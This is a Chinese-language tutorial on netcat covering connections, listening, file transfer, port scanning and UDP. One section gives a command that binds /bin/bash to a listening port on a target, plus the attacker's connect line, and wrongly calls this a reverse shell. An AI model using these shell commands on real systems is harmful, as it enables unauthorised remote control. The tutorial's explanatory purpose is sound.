### netcat

**Netcat**（简称 `nc`）是一个功能强大的网络工具，广泛用于网络调试、端口扫描、以及测试 TCP/IP 连接。它被称为“网络的瑞士军刀”，因为它既可以作为客户端，也可以作为服务器，用于在网络中进行数据传输。Netcat 可以支持 TCP 和 UDP 协议的连接，功能非常灵活且简单，常用于网络安全测试、故障排除和开发工作。

#### 基本使用

Netcat **作为客户端**使用时，使用命令格式：

```bash
nc [hostname] [port]
```

例如，尝试``192.168.1.1``的``8080``端口可以这么用：

```basj
nc 192.168.1.1 8080
```



Netcat 也可以作为一个简单的**服务器**监听指定端口，并等待连接。使用命令：

```bash
nc -l [port]
```

例如，监听本地`` 1234 ``端口：

```bash
nc -l 1234
```



Netcat 支持通过管道**传输文件**，可以通过标准输入输出发送数据或文件。

+ 发送文件：

```bash
nc [hostname] [port] < file.txt
```

+ 接收文件：

```bash
nc -l [port] > received_file.txt
```



Netcat 也可以用来**扫描目标主机的端口**，检测哪些端口开放。例如，扫描目标主机 `example.com` 的 1 到 1000 端口：

```bash
nc -zv example.com 1-1000
```

​	`-z`：扫描模式，不发送任何数据，只检查端口是否开放。

​	`-v`：启用详细模式，输出详细连接信息。



默认情况下，Netcat 使用 TCP 协议，但它也支持 **UDP 协议**。使用 `-u` 参数指定使用 UDP 协议。

+ 作为 UDP 服务器监听：

```bash
nc -u -l [port]
```

+ 作为 UDP 客户端发送数据：

```bash
echo -n "Hello" | nc -u [hostname] [port]
```



Netcat 可用于**创建反向 shell**（例如进行渗透测试），允许攻击者从远程主机控制目标系统。

+ 目标系统运行以下命令：

```bash
nc -l -p 1234 -e /bin/bash
```

+ 攻击者则通过以下命令连接到目标主机并获取 shell：

```bash
nc [target_ip] 1234
```



#### Netcat 的一些常用选项

- `-l`：让 Netcat 在指定端口上监听。
- `-v`：启用详细模式，显示连接过程的详细信息。
- `-z`：扫描端口，不发送数据，只检查端口是否开放。
- `-u`：使用 UDP 协议进行通信。
- `-p`：指定端口（用于监听时）。
- `-e`：指定程序，当连接建立时，执行该程序（例如 `/bin/bash`）。
- `-n`：不进行 DNS 解析，直接使用 IP 地址。
- `-w`：设置连接超时时间（秒）。